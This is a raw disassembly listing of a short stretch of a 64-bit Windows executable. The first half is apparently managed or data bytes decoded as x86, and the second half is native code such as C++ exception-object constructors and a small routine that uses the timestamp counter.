   140006570:	00 58 7f             	add    %bl,0x7f(%rax)
   140006573:	1a 00                	sbb    (%rax),%al
   140006575:	00 04 55 12 04 20 b0 	add    %al,-0x4fdffbee(,%rdx,2)
   14000657c:	00 00                	add    %al,(%rax)
   14000657e:	00 58 7f             	add    %bl,0x7f(%rax)
   140006581:	1b 00                	sbb    (%rax),%eax
   140006583:	00 04 55 12 04 20 b8 	add    %al,-0x47dffbee(,%rdx,2)
   14000658a:	00 00                	add    %al,(%rax)
   14000658c:	00 58 7f             	add    %bl,0x7f(%rax)
   14000658f:	1c 00                	sbb    $0x0,%al
   140006591:	00 04 55 12 04 0a 08 	add    %al,0x80a0412(,%rdx,2)
   140006598:	06                   	(bad)
   140006599:	4c 28 13             	rex.WR sub %r10b,(%rbx)
   14000659c:	00 00                	add    %al,(%rax)
   14000659e:	06                   	(bad)
   14000659f:	28 15 00 00 06 0b    	sub    %dl,0xb060000(%rip)        # 0x14b0665a5
   1400065a5:	07                   	(bad)
   1400065a6:	2c 16                	sub    $0x16,%al
   1400065a8:	02 12                	add    (%rdx),%dl
   1400065aa:	03 03                	add    (%rbx),%eax
   1400065ac:	28 34 00             	sub    %dh,(%rax,%rax,1)
   1400065af:	00 06                	add    %al,(%rsi)
   1400065b1:	4c 1f                	rex.WR (bad)
   1400065b3:	40 6a 58             	rex push $0x58
   1400065b6:	12 01                	adc    (%rcx),%al
   1400065b8:	28 35 00 00 06 26    	sub    %dh,0x26060000(%rip)        # 0x1660665be
   1400065be:	06                   	(bad)
   1400065bf:	1e                   	(bad)
   1400065c0:	6a 58                	push   $0x58
   1400065c2:	0a 06                	or     (%rsi),%al
   1400065c4:	12 04 20             	adc    (%rax,%riz,1),%al
   1400065c7:	c0 00 00             	rolb   $0x0,(%rax)
   1400065ca:	00 58 33             	add    %bl,0x33(%rax)
   1400065cd:	c9                   	leave
   1400065ce:	2a cc                	sub    %ah,%cl
   1400065d0:	03 30                	add    (%rax),%esi
   1400065d2:	03 00                	add    (%rax),%eax
   1400065d4:	20 00                	and    %al,(%rax)
   1400065d6:	00 00                	add    %al,(%rax)
   1400065d8:	18 00                	sbb    %al,(%rax)
   1400065da:	00 11                	add    %dl,(%rcx)
   1400065dc:	02 1e                	add    (%rsi),%bl
   1400065de:	6a 58                	push   $0x58
   1400065e0:	4c 0a 06             	rex.WR or (%rsi),%r8b
   1400065e3:	02 1f                	add    (%rdi),%bl
   1400065e5:	10 6a 58             	adc    %ch,0x58(%rdx)
   1400065e8:	4c                   	rex.WR
   1400065e9:	2e 08 02             	cs or  %al,(%rdx)
   1400065ec:	03 28                	add    (%rax),%ebp
   1400065ee:	49 00 00             	rex.WB add %al,(%r8)
   1400065f1:	06                   	(bad)
   1400065f2:	2a 02                	sub    (%rdx),%al
   1400065f4:	06                   	(bad)
   1400065f5:	03 28                	add    (%rax),%ebp
   1400065f7:	4a 00 00             	rex.WX add %al,(%rax)
   1400065fa:	06                   	(bad)
   1400065fb:	2a 03                	sub    (%rbx),%al
   1400065fd:	30 04 00             	xor    %al,(%rax,%rax,1)
   140006600:	19 00                	sbb    %eax,(%rax)
   140006602:	00 00                	add    %al,(%rax)
   140006604:	05 00 00 11 02       	add    $0x2110000,%eax
   140006609:	1e                   	(bad)
   14000660a:	6a 58                	push   $0x58
   14000660c:	4c 03 4c 55 02       	add    0x2(%rbp,%rdx,2),%r9
   140006611:	1e                   	(bad)
   140006612:	6a 58                	push   $0x58
   140006614:	4c 0a 06             	rex.WR or (%rsi),%r8b
   140006617:	02 1e                	add    (%rsi),%bl
   140006619:	6a 58                	push   $0x58
   14000661b:	06                   	(bad)
   14000661c:	1e                   	(bad)
   14000661d:	6a 58                	push   $0x58
   14000661f:	55                   	push   %rbp
   140006620:	2a cc                	sub    %ah,%cl
   140006622:	cc                   	int3
   140006623:	cc                   	int3
   140006624:	0b 30                	or     (%rax),%esi
   140006626:	04 00                	add    $0x0,%al
   140006628:	e0 00                	loopne 0x14000662a
   14000662a:	00 00                	add    %al,(%rax)
   14000662c:	3b 00                	cmp    (%rax),%eax
   14000662e:	00 11                	add    %dl,(%rcx)
   140006630:	02 4c 13 08          	add    0x8(%rbx,%rdx,1),%cl
   140006634:	03 11                	add    (%rcx),%edx
   140006636:	08 59 19             	or     %bl,0x19(%rcx)
   140006639:	63 13                	movsxd (%rbx),%edx
   14000663b:	09 02                	or     %eax,(%rdx)
   14000663d:	1e                   	(bad)
   14000663e:	6a 58                	push   $0x58
   140006640:	4c 11 08             	adc    %r9,(%rax)
   140006643:	59                   	pop    %rcx
   140006644:	19 63 13             	sbb    %esp,0x13(%rbx)
   140006647:	07                   	(bad)
   140006648:	11 07                	adc    %eax,(%rdi)
   14000664a:	02 28                	add    (%rax),%ch
   14000664c:	6d                   	insl   (%dx),(%rdi)
   14000664d:	00 00                	add    %al,(%rax)
   14000664f:	06                   	(bad)
   140006650:	33 05 28 6a 00 00    	xor    0x6a28(%rip),%eax        # 0x14000d07e
   140006656:	06                   	(bad)
   140006657:	11 07                	adc    %eax,(%rdi)
   140006659:	17                   	(bad)
   14000665a:	6a 58                	push   $0x58
   14000665c:	13 06                	adc    (%rsi),%eax
   14000665e:	02 11                	add    (%rcx),%dl
   140006660:	06                   	(bad)
   140006661:	28 6c 00 00          	sub    %ch,0x0(%rax,%rax,1)
   140006665:	06                   	(bad)
   140006666:	13 05 02 12 05 28    	adc    0x28051202(%rip),%eax        # 0x16805786e
   14000666c:	59                   	pop    %rcx
   14000666d:	00 00                	add    %al,(%rax)
   14000666f:	06                   	(bad)
   140006670:	0a 11                	or     (%rcx),%dl
   140006672:	09 1e                	or     %ebx,(%rsi)
   140006674:	6a 5a                	push   $0x5a
   140006676:	06                   	(bad)
   140006677:	58                   	pop    %rax
   140006678:	0b 07                	or     (%rdi),%eax
   14000667a:	1e                   	(bad)
   14000667b:	6a 58                	push   $0x58
   14000667d:	13 04 11             	adc    (%rcx,%rdx,1),%eax
   140006680:	04 0d                	add    $0xd,%al
   140006682:	12 0a                	adc    (%rdx),%cl
   140006684:	02 55 12             	add    0x12(%rbp),%dl
   140006687:	0a 1e                	or     (%rsi),%bl
   140006689:	58                   	pop    %rax
   14000668a:	06                   	(bad)
   14000668b:	55                   	push   %rbp
   14000668c:	12 0a                	adc    (%rdx),%cl
   14000668e:	1f                   	(bad)
   14000668f:	10 58 11             	adc    %bl,0x11(%rax)
   140006692:	05 55 12 0a 1f       	add    $0x1f0a1255,%eax
   140006697:	18 58 09             	sbb    %bl,0x9(%rax)
   14000669a:	55                   	push   %rbp
   14000669b:	12 0a                	adc    (%rdx),%cl
   14000669d:	1f                   	(bad)
   14000669e:	20 58 09             	and    %bl,0x9(%rax)
   1400066a1:	55                   	push   %rbp
   1400066a2:	07                   	(bad)
   1400066a3:	04 4c                	add    $0x4c,%al
   1400066a5:	55                   	push   %rbp
   1400066a6:	12 0a                	adc    (%rdx),%cl
   1400066a8:	1f                   	(bad)
   1400066a9:	18 58 07             	sbb    %bl,0x7(%rax)
   1400066ac:	55                   	push   %rbp
   1400066ad:	02 1e                	add    (%rsi),%bl
   1400066af:	6a 58                	push   $0x58
   1400066b1:	4c 0c 03             	rex.WR or $0x3,%al
   1400066b4:	08 33                	or     %dh,(%rbx)
   1400066b6:	0d 02 4c 08 06       	or     $0x6084c02,%eax
   1400066bb:	02 28                	add    (%rax),%ch
   1400066bd:	5a                   	pop    %rdx
   1400066be:	00 00                	add    %al,(%rax)
   1400066c0:	06                   	(bad)
   1400066c1:	26 2b 21             	es sub (%rcx),%esp
   1400066c4:	02 4c 03 06          	add    0x6(%rbx,%rax,1),%cl
   1400066c8:	02 28                	add    (%rax),%ch
   1400066ca:	5a                   	pop    %rdx
   1400066cb:	00 00                	add    %al,(%rax)
   1400066cd:	06                   	(bad)
   1400066ce:	26 12 0a             	es adc (%rdx),%cl
   1400066d1:	1f                   	(bad)
   1400066d2:	18 58 06             	sbb    %bl,0x6(%rax)
   1400066d5:	55                   	push   %rbp
   1400066d6:	03 02                	add    (%rdx),%eax
   1400066d8:	1e                   	(bad)
   1400066d9:	6a 58                	push   $0x58
   1400066db:	4c 11 04 02          	adc    %r8,(%rdx,%rax,1)
   1400066df:	28 5a 00             	sub    %bl,0x0(%rdx)
   1400066e2:	00 06                	add    %al,(%rsi)
   1400066e4:	26 12 0a             	es adc (%rdx),%cl
   1400066e7:	1e                   	(bad)
   1400066e8:	58                   	pop    %rax
   1400066e9:	16                   	(bad)
   1400066ea:	6a 55                	push   $0x55
   1400066ec:	02 06                	add    (%rsi),%al
   1400066ee:	11 06                	adc    %eax,(%rsi)
   1400066f0:	11 05 28 6b 00 00    	adc    %eax,0x6b28(%rip)        # 0x14000d21e
   1400066f6:	06                   	(bad)
   1400066f7:	de 0e                	fimuls (%rsi)
   1400066f9:	fe 06                	incb   (%rsi)
   1400066fb:	66 00 00             	data16 add %al,(%rax)
   1400066fe:	06                   	(bad)
   1400066ff:	12 0a                	adc    (%rdx),%cl
   140006701:	28 7d 00             	sub    %bh,0x0(%rbp)
   140006704:	00 06                	add    %al,(%rsi)
   140006706:	dc 12                	fcoml  (%rdx)
   140006708:	0a 28                	or     (%rax),%ch
   14000670a:	66 00 00             	data16 add %al,(%rax)
   14000670d:	06                   	(bad)
   14000670e:	07                   	(bad)
   14000670f:	2a 41 1c             	sub    0x1c(%rcx),%al
   140006712:	00 00                	add    %al,(%rax)
   140006714:	04 00                	add    $0x0,%al
   140006716:	00 00                	add    %al,(%rax)
   140006718:	72 00                	jb     0x14000671a
   14000671a:	00 00                	add    %al,(%rax)
   14000671c:	57                   	push   %rdi
   14000671d:	00 00                	add    %al,(%rax)
   14000671f:	00 c9                	add    %cl,%cl
   140006721:	00 00                	add    %al,(%rax)
   140006723:	00 0e                	add    %cl,(%rsi)
   140006725:	00 00                	add    %al,(%rax)
   140006727:	00 3b                	add    %bh,(%rbx)
   140006729:	00 00                	add    %al,(%rax)
   14000672b:	01 03                	add    %eax,(%rbx)
   14000672d:	30 01                	xor    %al,(%rcx)
   14000672f:	00 0a                	add    %cl,(%rdx)
   140006731:	00 00                	add    %al,(%rax)
   140006733:	00 00                	add    %al,(%rax)
   140006735:	00 00                	add    %al,(%rax)
   140006737:	00 21                	add    %ah,(%rcx)
   140006739:	ff                   	(bad)
   14000673a:	ff                   	(bad)
   14000673b:	ff                   	(bad)
   14000673c:	ff                   	(bad)
   14000673d:	ff                   	(bad)
   14000673e:	ff                   	(bad)
   14000673f:	ff 1f                	lcall  *(%rdi)
   140006741:	2a cc                	sub    %ah,%cl
   140006743:	cc                   	int3
   140006744:	03 30                	add    (%rax),%esi
   140006746:	03 00                	add    (%rax),%eax
   140006748:	2c 00                	sub    $0x0,%al
   14000674a:	00 00                	add    %al,(%rax)
   14000674c:	1c 00                	sbb    $0x0,%al
   14000674e:	00 11                	add    %dl,(%rcx)
   140006750:	02 1f                	add    (%rdi),%bl
   140006752:	10 6a 58             	adc    %ch,0x58(%rdx)
   140006755:	4c 02 4c 59 19       	rex.WR add 0x19(%rcx,%rbx,2),%r9b
   14000675a:	63 0a                	movsxd (%rdx),%ecx
   14000675c:	02 28                	add    (%rax),%ch
   14000675e:	6d                   	insl   (%dx),(%rdi)
   14000675f:	00 00                	add    %al,(%rax)
   140006761:	06                   	(bad)
   140006762:	0d 06 17 64 0c       	or     $0xc641706,%eax
   140006767:	06                   	(bad)
   140006768:	09 08                	or     %ecx,(%rax)
   14000676a:	59                   	pop    %rcx
   14000676b:	36 02 09             	ss add (%rcx),%cl
   14000676e:	2a 08                	sub    (%rax),%cl
   140006770:	06                   	(bad)
   140006771:	58                   	pop    %rax
   140006772:	0b 07                	or     (%rdi),%eax
   140006774:	03 37                	add    (%rdi),%esi
   140006776:	03 07                	add    (%rdi),%eax
   140006778:	2b 01                	sub    (%rcx),%eax
   14000677a:	03 2a                	add    (%rdx),%ebp
   14000677c:	03 30                	add    (%rax),%esi
   14000677e:	03 00                	add    (%rax),%eax
   140006780:	4a 00 00             	rex.WX add %al,(%rax)
   140006783:	00 17                	add    %dl,(%rdi)
   140006785:	00 00                	add    %al,(%rax)
   140006787:	11 02                	adc    %eax,(%rdx)
   140006789:	1e                   	(bad)
   14000678a:	6a 58                	push   $0x58
   14000678c:	02 4c 0a 06          	add    0x6(%rdx,%rcx,1),%cl
   140006790:	2c 29                	sub    $0x29,%al
   140006792:	02 1f                	add    (%rdi),%bl
   140006794:	10 6a 58             	adc    %ch,0x58(%rdx)
   140006797:	4c 06                	rex.WR (bad)
   140006799:	59                   	pop    %rcx
   14000679a:	19 63 1e             	sbb    %esp,0x1e(%rbx)
   14000679d:	6a 5a                	push   $0x5a
   14000679f:	0b 06                	or     (%rsi),%eax
   1400067a1:	0c 07                	or     $0x7,%al
   1400067a3:	20 00                	and    %al,(%rax)
   1400067a5:	10 00                	adc    %al,(%rax)
   1400067a7:	00 6a 37             	add    %ch,0x37(%rdx)
   1400067aa:	09 12                	or     %edx,(%rdx)
   1400067ac:	02 12                	add    (%rdx),%dl
   1400067ae:	01 28                	add    %ebp,(%rax)
   1400067b0:	0a 00                	or     (%rax),%al
   1400067b2:	00 06                	add    %al,(%rsi)
   1400067b4:	08 07                	or     %al,(%rdi)
   1400067b6:	28 da                	sub    %bl,%dl
   1400067b8:	00 00                	add    %al,(%rax)
   1400067ba:	06                   	(bad)
   1400067bb:	02 03                	add    (%rbx),%al
   1400067bd:	55                   	push   %rbp
   1400067be:	04 1e                	add    $0x1e,%al
   1400067c0:	6a 5a                	push   $0x5a
   1400067c2:	03 58 55             	add    0x55(%rax),%ebx
   1400067c5:	02 1f                	add    (%rdi),%bl
   1400067c7:	10 6a 58             	adc    %ch,0x58(%rdx)
   1400067ca:	05 1e 6a 5a 03       	add    $0x35a6a1e,%eax
   1400067cf:	58                   	pop    %rax
   1400067d0:	55                   	push   %rbp
   1400067d1:	2a 00                	sub    (%rax),%al
   1400067d3:	00 03                	add    %al,(%rbx)
   1400067d5:	30 02                	xor    %al,(%rdx)
   1400067d7:	00 1e                	add    %bl,(%rsi)
   1400067d9:	00 00                	add    %al,(%rax)
   1400067db:	00 14 00             	add    %dl,(%rax,%rax,1)
   1400067de:	00 11                	add    %dl,(%rcx)
   1400067e0:	03 4c 0a 06          	add    0x6(%rdx,%rcx,1),%ecx
   1400067e4:	21 ff                	and    %edi,%edi
   1400067e6:	ff                   	(bad)
   1400067e7:	ff                   	(bad)
   1400067e8:	ff                   	(bad)
   1400067e9:	ff                   	(bad)
   1400067ea:	ff                   	(bad)
   1400067eb:	ff 1f                	lcall  *(%rdi)
   1400067ed:	36 05 28 09 00 00    	ss add $0x928,%eax
   1400067f3:	06                   	(bad)
   1400067f4:	06                   	(bad)
   1400067f5:	1e                   	(bad)
   1400067f6:	6a 5a                	push   $0x5a
   1400067f8:	28 74 00 00          	sub    %dh,0x0(%rax,%rax,1)
   1400067fc:	06                   	(bad)
   1400067fd:	2a cc                	sub    %ah,%cl
   1400067ff:	cc                   	int3
   140006800:	03 30                	add    (%rax),%esi
   140006802:	02 00                	add    (%rax),%al
   140006804:	2f                   	(bad)
   140006805:	00 00                	add    %al,(%rax)
   140006807:	00 17                	add    %dl,(%rdi)
   140006809:	00 00                	add    %al,(%rax)
   14000680b:	11 02                	adc    %eax,(%rdx)
   14000680d:	1e                   	(bad)
   14000680e:	6a 58                	push   $0x58
   140006810:	4c 0b 07             	or     (%rdi),%r8
   140006813:	2c 25                	sub    $0x25,%al
   140006815:	02 1f                	add    (%rdi),%bl
   140006817:	10 6a 58             	adc    %ch,0x58(%rdx)
   14000681a:	4c 1e                	rex.WR (bad)
   14000681c:	6a 5a                	push   $0x5a
   14000681e:	0a 07                	or     (%rdi),%al
   140006820:	0c 06                	or     $0x6,%al
   140006822:	20 00                	and    %al,(%rax)
   140006824:	10 00                	adc    %al,(%rax)
   140006826:	00 6a 37             	add    %ch,0x37(%rdx)
   140006829:	09 12                	or     %edx,(%rdx)
   14000682b:	02 12                	add    (%rdx),%dl
   14000682d:	00 28                	add    %ch,(%rax)
   14000682f:	0a 00                	or     (%rax),%al
   140006831:	00 06                	add    %al,(%rsi)
   140006833:	08 06                	or     %al,(%rsi)
   140006835:	28 da                	sub    %bl,%dl
   140006837:	00 00                	add    %al,(%rax)
   140006839:	06                   	(bad)
   14000683a:	2a 00                	sub    (%rax),%al
   14000683c:	03 30                	add    (%rax),%esi
   14000683e:	03 00                	add    (%rax),%eax
   140006840:	14 00                	adc    $0x0,%al
   140006842:	00 00                	add    %al,(%rax)
   140006844:	00 00                	add    %al,(%rax)
   140006846:	00 00                	add    %al,(%rax)
   140006848:	02 03                	add    (%rbx),%al
   14000684a:	04 28                	add    $0x28,%al
   14000684c:	71 00                	jno    0x14000684e
   14000684e:	00 06                	add    %al,(%rsi)
   140006850:	26 03 02             	es add (%rdx),%eax
   140006853:	59                   	pop    %rcx
   140006854:	19 63 1e             	sbb    %esp,0x1e(%rbx)
   140006857:	6a 5a                	push   $0x5a
   140006859:	04 58                	add    $0x58,%al
   14000685b:	2a 03                	sub    (%rbx),%al
   14000685d:	30 02                	xor    %al,(%rdx)
   14000685f:	00 0b                	add    %cl,(%rbx)
   140006861:	00 00                	add    %al,(%rax)
   140006863:	00 00                	add    %al,(%rax)
   140006865:	00 00                	add    %al,(%rax)
   140006867:	00 02                	add    %al,(%rdx)
   140006869:	1e                   	(bad)
   14000686a:	6a 58                	push   $0x58
   14000686c:	4c 02 4c 59 19       	rex.WR add 0x19(%rcx,%rbx,2),%r9b
   140006871:	63 2a                	movsxd (%rdx),%ebp
   140006873:	cc                   	int3
   140006874:	03 30                	add    (%rax),%esi
   140006876:	02 00                	add    (%rax),%al
   140006878:	08 00                	or     %al,(%rax)
   14000687a:	00 00                	add    %al,(%rax)
   14000687c:	00 00                	add    %al,(%rax)
   14000687e:	00 00                	add    %al,(%rax)
   140006880:	03 1e                	add    (%rsi),%ebx
   140006882:	6a 5a                	push   $0x5a
   140006884:	02 4c 58 2a          	add    0x2a(%rax,%rbx,2),%cl
   140006888:	48 8b c4             	mov    %rsp,%rax
   14000688b:	48 89 58 08          	mov    %rbx,0x8(%rax)
   14000688f:	48 89 68 10          	mov    %rbp,0x10(%rax)
   140006893:	48 89 70 18          	mov    %rsi,0x18(%rax)
   140006897:	48 89 78 20          	mov    %rdi,0x20(%rax)
   14000689b:	41 56                	push   %r14
   14000689d:	48 83 ec 20          	sub    $0x20,%rsp
   1400068a1:	48 8b ea             	mov    %rdx,%rbp
   1400068a4:	4c 8b f1             	mov    %rcx,%r14
   1400068a7:	e8 d4 27 00 00       	call   0x140009080
   1400068ac:	48 8b c8             	mov    %rax,%rcx
   1400068af:	e8 bc 27 00 00       	call   0x140009070
   1400068b4:	84 c0                	test   %al,%al
   1400068b6:	74 0b                	je     0x1400068c3
   1400068b8:	48 8b d5             	mov    %rbp,%rdx
   1400068bb:	49 8b ce             	mov    %r14,%rcx
   1400068be:	e8 cd 27 00 00       	call   0x140009090
   1400068c3:	48 8b d5             	mov    %rbp,%rdx
   1400068c6:	49 8b ce             	mov    %r14,%rcx
   1400068c9:	e8 b2 27 00 00       	call   0x140009080
   1400068ce:	48 8b c8             	mov    %rax,%rcx
   1400068d1:	e8 9a 27 00 00       	call   0x140009070
   1400068d6:	84 c0                	test   %al,%al
   1400068d8:	75 5a                	jne    0x140006934
   1400068da:	48 8b d5             	mov    %rbp,%rdx
   1400068dd:	49 8b ce             	mov    %r14,%rcx
   1400068e0:	e8 9b 27 00 00       	call   0x140009080
   1400068e5:	48 8b c8             	mov    %rax,%rcx
   1400068e8:	e8 b3 27 00 00       	call   0x1400090a0
   1400068ed:	48 8b f0             	mov    %rax,%rsi
   1400068f0:	0f 31                	rdtsc
   1400068f2:	48 c1 e2 20          	shl    $0x20,%rdx
   1400068f6:	48 0b c2             	or     %rdx,%rax
   1400068f9:	48 8b f8             	mov    %rax,%rdi
   1400068fc:	e8 9c 21 00 00       	call   0x140008a9d
   140006901:	8b d8                	mov    %eax,%ebx
   140006903:	e8 89 21 00 00       	call   0x140008a91
   140006908:	c1 e0 10             	shl    $0x10,%eax
   14000690b:	33 d2                	xor    %edx,%edx
   14000690d:	48 33 c3             	xor    %rbx,%rax
   140006910:	49 8b ce             	mov    %r14,%rcx
   140006913:	48 33 c7             	xor    %rdi,%rax
   140006916:	48 f7 f6             	div    %rsi
   140006919:	48 8b da             	mov    %rdx,%rbx
   14000691c:	48 8b d5             	mov    %rbp,%rdx
   14000691f:	e8 5c 27 00 00       	call   0x140009080
   140006924:	48 8b c8             	mov    %rax,%rcx
   140006927:	48 8b d3             	mov    %rbx,%rdx
   14000692a:	e8 81 27 00 00       	call   0x1400090b0
   14000692f:	48 8b 00             	mov    (%rax),%rax
   140006932:	eb 02                	jmp    0x140006936
   140006934:	33 c0                	xor    %eax,%eax
   140006936:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000693b:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140006940:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140006945:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   14000694a:	48 83 c4 20          	add    $0x20,%rsp
   14000694e:	41 5e                	pop    %r14
   140006950:	c3                   	ret
   140006951:	cc                   	int3
   140006952:	cc                   	int3
   140006953:	cc                   	int3
   140006954:	48 8b c4             	mov    %rsp,%rax
   140006957:	4c 89 40 18          	mov    %r8,0x18(%rax)
   14000695b:	4c 89 48 20          	mov    %r9,0x20(%rax)
   14000695f:	53                   	push   %rbx
   140006960:	55                   	push   %rbp
   140006961:	56                   	push   %rsi
   140006962:	57                   	push   %rdi
   140006963:	48 83 ec 48          	sub    $0x48,%rsp
   140006967:	49 8b f0             	mov    %r8,%rsi
   14000696a:	48 8d 68 20          	lea    0x20(%rax),%rbp
   14000696e:	48 8b da             	mov    %rdx,%rbx
   140006971:	48 8b f9             	mov    %rcx,%rdi
   140006974:	e8 3b 00 00 00       	call   0x1400069b4
   140006979:	48 89 6c 24 28       	mov    %rbp,0x28(%rsp)
   14000697e:	4c 8b ce             	mov    %rsi,%r9
   140006981:	4c 8b c3             	mov    %rbx,%r8
   140006984:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   14000698b:	00 00 
   14000698d:	48 8b d7             	mov    %rdi,%rdx
   140006990:	48 8b 08             	mov    (%rax),%rcx
   140006993:	e8 4d 21 00 00       	call   0x140008ae5
   140006998:	83 c9 ff             	or     $0xffffffff,%ecx
   14000699b:	48 c7 44 24 30 00 00 	movq   $0x0,0x30(%rsp)
   1400069a2:	00 00 
   1400069a4:	85 c0                	test   %eax,%eax
   1400069a6:	0f 48 c1             	cmovs  %ecx,%eax
   1400069a9:	48 83 c4 48          	add    $0x48,%rsp
   1400069ad:	5f                   	pop    %rdi
   1400069ae:	5e                   	pop    %rsi
   1400069af:	5d                   	pop    %rbp
   1400069b0:	5b                   	pop    %rbx
   1400069b1:	c3                   	ret
   1400069b2:	cc                   	int3
   1400069b3:	cc                   	int3
   1400069b4:	48 8d 05 15 39 01 00 	lea    0x13915(%rip),%rax        # 0x14001a2d0
   1400069bb:	c3                   	ret
   1400069bc:	ff 25 7e 38 00 00    	jmp    *0x387e(%rip)        # 0x14000a240
   1400069c2:	cc                   	int3
   1400069c3:	cc                   	int3
   1400069c4:	40 53                	rex push %rbx
   1400069c6:	48 83 ec 20          	sub    $0x20,%rsp
   1400069ca:	48 8d 05 bf 3e 00 00 	lea    0x3ebf(%rip),%rax        # 0x14000a890
   1400069d1:	48 8b d9             	mov    %rcx,%rbx
   1400069d4:	48 89 01             	mov    %rax,(%rcx)
   1400069d7:	f6 c2 01             	test   $0x1,%dl
   1400069da:	74 0a                	je     0x1400069e6
   1400069dc:	ba 18 00 00 00       	mov    $0x18,%edx
   1400069e1:	e8 da 03 00 00       	call   0x140006dc0
   1400069e6:	48 8b c3             	mov    %rbx,%rax
   1400069e9:	48 83 c4 20          	add    $0x20,%rsp
   1400069ed:	5b                   	pop    %rbx
   1400069ee:	c3                   	ret
   1400069ef:	cc                   	int3
   1400069f0:	40 53                	rex push %rbx
   1400069f2:	48 83 ec 20          	sub    $0x20,%rsp
   1400069f6:	48 8b d9             	mov    %rcx,%rbx
   1400069f9:	48 8b c2             	mov    %rdx,%rax
   1400069fc:	48 8d 0d 05 36 01 00 	lea    0x13605(%rip),%rcx        # 0x14001a008
   140006a03:	0f 57 c0             	xorps  %xmm0,%xmm0
   140006a06:	48 89 0b             	mov    %rcx,(%rbx)
   140006a09:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   140006a0d:	48 8d 48 08          	lea    0x8(%rax),%rcx
   140006a11:	0f 11 02             	movups %xmm0,(%rdx)
   140006a14:	e8 a8 20 00 00       	call   0x140008ac1
   140006a19:	48 8d 05 00 36 01 00 	lea    0x13600(%rip),%rax        # 0x14001a020
   140006a20:	48 89 03             	mov    %rax,(%rbx)
   140006a23:	48 8b c3             	mov    %rbx,%rax
   140006a26:	48 83 c4 20          	add    $0x20,%rsp
   140006a2a:	5b                   	pop    %rbx
   140006a2b:	c3                   	ret
   140006a2c:	48 8d 05 65 3e 00 00 	lea    0x3e65(%rip),%rax        # 0x14000a898
   140006a33:	48 c7 41 10 00 00 00 	movq   $0x0,0x10(%rcx)
   140006a3a:	00 
   140006a3b:	48 89 41 08          	mov    %rax,0x8(%rcx)
   140006a3f:	48 8d 05 da 35 01 00 	lea    0x135da(%rip),%rax        # 0x14001a020
   140006a46:	48 89 01             	mov    %rax,(%rcx)
   140006a49:	48 8b c1             	mov    %rcx,%rax
   140006a4c:	c3                   	ret
   140006a4d:	cc                   	int3
   140006a4e:	cc                   	int3
   140006a4f:	cc                   	int3
   140006a50:	40 53                	rex push %rbx
   140006a52:	48 83 ec 20          	sub    $0x20,%rsp
   140006a56:	48 8b d9             	mov    %rcx,%rbx
   140006a59:	48 8b c2             	mov    %rdx,%rax
   140006a5c:	48 8d 0d a5 35 01 00 	lea    0x135a5(%rip),%rcx        # 0x14001a008
   140006a63:	0f 57 c0             	xorps  %xmm0,%xmm0
   140006a66:	48 89 0b             	mov    %rcx,(%rbx)
   140006a69:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   140006a6d:	48 8d 48 08          	lea    0x8(%rax),%rcx
   140006a71:	0f 11 02             	movups %xmm0,(%rdx)
   140006a74:	e8 48 20 00 00       	call   0x140008ac1
   140006a79:	48 8d 05 b8 35 01 00 	lea    0x135b8(%rip),%rax        # 0x14001a038
   140006a80:	48 89 03             	mov    %rax,(%rbx)
   140006a83:	48 8b c3             	mov    %rbx,%rax
   140006a86:	48 83 c4 20          	add    $0x20,%rsp
   140006a8a:	5b                   	pop    %rbx
   140006a8b:	c3                   	ret
   140006a8c:	48 8d 05 f5 38 00 00 	lea    0x38f5(%rip),%rax        # 0x14000a388
   140006a93:	48 c7 41 10 00 00 00 	movq   $0x0,0x10(%rcx)
   140006a9a:	00 
   140006a9b:	48 89 41 08          	mov    %rax,0x8(%rcx)
   140006a9f:	48 8d 05 92 35 01 00 	lea    0x13592(%rip),%rax        # 0x14001a038
   140006aa6:	48 89 01             	mov    %rax,(%rcx)
   140006aa9:	48 8b c1             	mov    %rcx,%rax
   140006aac:	c3                   	ret
   140006aad:	cc                   	int3
   140006aae:	cc                   	int3
   140006aaf:	cc                   	int3
   140006ab0:	40 53                	rex push %rbx
   140006ab2:	48 83 ec 20          	sub    $0x20,%rsp
   140006ab6:	48 8b d9             	mov    %rcx,%rbx
   140006ab9:	48 8b c2             	mov    %rdx,%rax
   140006abc:	48 8d 0d 45 35 01 00 	lea    0x13545(%rip),%rcx        # 0x14001a008
   140006ac3:	0f 57 c0             	xorps  %xmm0,%xmm0
   140006ac6:	48 89 0b             	mov    %rcx,(%rbx)
   140006ac9:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   140006acd:	48 8d 48 08          	lea    0x8(%rax),%rcx
   140006ad1:	0f 11 02             	movups %xmm0,(%rdx)
   140006ad4:	e8 e8 1f 00 00       	call   0x140008ac1
   140006ad9:	48 8b c3             	mov    %rbx,%rax
   140006adc:	48 83 c4 20          	add    $0x20,%rsp
   140006ae0:	5b                   	pop    %rbx
   140006ae1:	c3                   	ret
   140006ae2:	cc                   	int3
   140006ae3:	cc                   	int3
   140006ae4:	48 8d 05 1d 35 01 00 	lea    0x1351d(%rip),%rax        # 0x14001a008
   140006aeb:	48 89 01             	mov    %rax,(%rcx)
   140006aee:	48 83 c1 08          	add    $0x8,%rcx
   140006af2:	e9 d0 1f 00 00       	jmp    0x140008ac7
   140006af7:	cc                   	int3
   140006af8:	48 83 ec 48          	sub    $0x48,%rsp
   140006afc:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140006b01:	e8 26 ff ff ff       	call   0x140006a2c
   140006b06:	48 8d 15 8b 22 01 00 	lea    0x1228b(%rip),%rdx        # 0x140018d98
   140006b0d:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140006b12:	e8 b6 1f 00 00       	call   0x140008acd
   140006b17:	cc                   	int3
   140006b18:	48 83 ec 48          	sub    $0x48,%rsp
   140006b1c:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140006b21:	e8 66 ff ff ff       	call   0x140006a8c
   140006b26:	48 8d 15 4b 22 01 00 	lea    0x1224b(%rip),%rdx        # 0x140018d78
   140006b2d:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140006b32:	e8 96 1f 00 00       	call   0x140008acd
   140006b37:	cc                   	int3
   140006b38:	48 83 79 08 00       	cmpq   $0x0,0x8(%rcx)
   140006b3d:	48 8d 05 ac 3b 00 00 	lea    0x3bac(%rip),%rax        # 0x14000a6f0
